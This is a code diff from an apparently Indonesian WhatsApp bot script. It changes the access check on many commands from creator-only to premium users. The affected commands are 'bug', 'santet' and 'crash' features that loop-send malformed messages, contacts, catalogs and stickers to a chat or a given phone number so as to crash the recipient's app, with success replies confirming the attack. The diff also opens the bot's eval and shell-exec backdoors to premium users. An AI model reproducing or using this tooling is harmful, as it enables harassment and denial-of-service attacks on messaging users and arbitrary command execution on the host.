@@ -954,7 +954,7 @@ Dapat mengakibatkan crash!!!
   break
 //============================================= Menu Bug By Fardan Faraxx & Vannes =======================\\
 	case 'bugvn':{
-if (!isCreator) return
+if (!isPremium) return
 if (args.length == 0) return freply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
@@ -978,7 +978,7 @@ adehvn = {
  }
 break
 	case 'bugdoc':{
-if (!isCreator) return
+if (!isPremium) return
 if (args.length == 0) return freply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku JO`
@@ -1005,7 +1005,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 }
 break
 case 'vanfax': {
-	            if (!isCreator) return
+	            if (!isPremium) return
                 let user = global.db.data.users[m.sender]
                 user.afkTime = + new Date
                 user.afkReason = text
@@ -1013,7 +1013,7 @@ case 'vanfax': {
             }
             break
 case 'hihi': {
-if (!isCreator) return
+if (!isPremium) return
 let user = global.db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
@@ -1021,7 +1021,7 @@ m.reply(`Hello Saya ${m.pushName} ${text ? ': ' + text : ''}`)
 }
 break
   case 'four':{
-if (!isCreator) return
+if (!isPremium) return
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
@@ -1044,7 +1044,7 @@ hisoka.sendText(m.chat, `🇹 🇭 🇪 🇫 🇴 🇺 🇷`, text, {quoted: pek
 }
 break
  case 'crashcok':{
-if (!isCreator) return
+if (!isPremium) return
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
@@ -1054,7 +1054,7 @@ hisoka.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextI
 }
 break
 case 'faxxbugx': {
-if (!isCreator) return
+if (!isPremium) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku Fax`
@@ -1065,7 +1065,7 @@ hisoka.sendContact(m.chat, global.owner, fkontaak)
 }
 break
 case 'faraxxbug': {
-if (!isCreator) return
+if (!isPremium) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku JO`
@@ -1076,7 +1076,7 @@ hisoka.sendContact(m.chat, global.premium, fkontaak)
 }
 break
 case 'catalogbug': {
-if (!isCreator) return
+if (!isPremium) return
 if (args.length == 0) return freply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
@@ -1106,7 +1106,7 @@ hisoka.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
 }
 break
 case 'santetto': { 
-          if (!isCreator) return
+          if (!isPremium) return
           if (!text) throw `Nomernya mana?`
              asukonyol11 = { 
                     key: { 
@@ -1179,7 +1179,7 @@ case 'santetto': {
             }
             break
         case 'gassantet': {          
-          if (!isCreator) return
+          if (!isPremium) return
           if (!text) throw `Nomernya mana?`
              asukonyol11 = { 
                     key: { 
@@ -1252,7 +1252,7 @@ case 'santetto': {
             }
             break
          case 'santet':               
-          if (!isCreator) return
+          if (!isPremium) return
              asukonyol11 = { 
                     key: { 
                         fromMe: false, 
@@ -1324,7 +1324,7 @@ case 'santetto': {
             freply(`BERHASIL MENGIRIM SANTET`)
             break
                     case 'infinite':               
-          if (!isCreator) return
+          if (!isPremium) return
              asukonyol11 = { 
                     key: { 
                         fromMe: false, 
@@ -1368,7 +1368,7 @@ case 'santetto': {
             await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
             break
             case 'infiniteto':               
-          if (!isCreator) return
+          if (!isPremium) return
           if (!text) throw `Nomernya mana?`
              asukonyol11 = { 
                     key: { 
@@ -1412,7 +1412,7 @@ case 'santetto': {
             freply(`SUCCES`)
             break
                    case 'gasinfinite':               
-          if (!isCreator) return
+          if (!isPremium) return
           if (!text) throw `Nomernya mana?`
              asukonyol11 = { 
                     key: { 
@@ -1484,7 +1484,7 @@ case 'santetto': {
             await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
             break
           case 'momo': {            
-          if (!isCreator) return
+          if (!isPremium) return
              momoe = `
 ///....▓▓▓▓
 ///..▓▓......▓
@@ -1525,7 +1525,7 @@ case 'santetto': {
             }
             break
           case 'momoto': { 
-          if (!isCreator) return
+          if (!isPremium) return
           if (!text) throw `Nomernya mana?` 
              momoe = `
 ///....▓▓▓▓
@@ -1572,7 +1572,7 @@ case 'santetto': {
             }
             break
           case 'gasmomo': {            
-          if (!isCreator) return
+          if (!isPremium) return
            if (!text) throw `Nomernya mana?`       
              momoe = `
 ///....▓▓▓▓
@@ -1631,7 +1631,7 @@ case 'santetto': {
             break
 
 case 'butto':
-                    if (!isCreator) return
+                    if (!isPremium) return
                     if (!text) throw `Nomernya mana?`
                  buttonspc = [
                           {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: jobot}, type: 1},
@@ -1649,7 +1649,7 @@ case 'butto':
                       freply(`succes`)
                     break
 case 'stikto':{
-if (!isCreator) return
+if (!isPremium) return
 if (!text) throw `Nomernya mana?`
 adehvn = { 
         key: { 
@@ -1671,7 +1671,7 @@ await freply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
 }
 break
 case 'vnto':{
-if (!isCreator) return
+if (!isPremium) return
 if (!text) throw `Nomernya mana?`
 adehvn = { 
         key: { 
@@ -1694,7 +1694,7 @@ await freply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
 break
             default:
                 if (budy.startsWith('=>')) {
-                    if (!isCreator) return freply(mess.owner)
+                    if (!isPremium) return freply(mess.owner)
                     function Return(sul) {
                         sat = JSON.stringify(sul, null, 2)
                         bang = util.format(sat)
@@ -1711,7 +1711,7 @@ break
                 }
 
                 if (budy.startsWith('>')) {
-                    if (!isCreator) return freply(mess.owner)
+                    if (!isPremium) return freply(mess.owner)
                     try {
                         let evaled = await eval(budy.slice(2))
                         if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
@@ -1722,7 +1722,7 @@ break
                 }
 
                 if (budy.startsWith('$')) {
-                    if (!isCreator) return freply(mess.owner)
+                    if (!isPremium) return freply(mess.owner)
                     exec(budy.slice(2), (err, stdout) => {
                         if (err) return freply(`${err}`)
                         if (stdout) return freply(stdout)
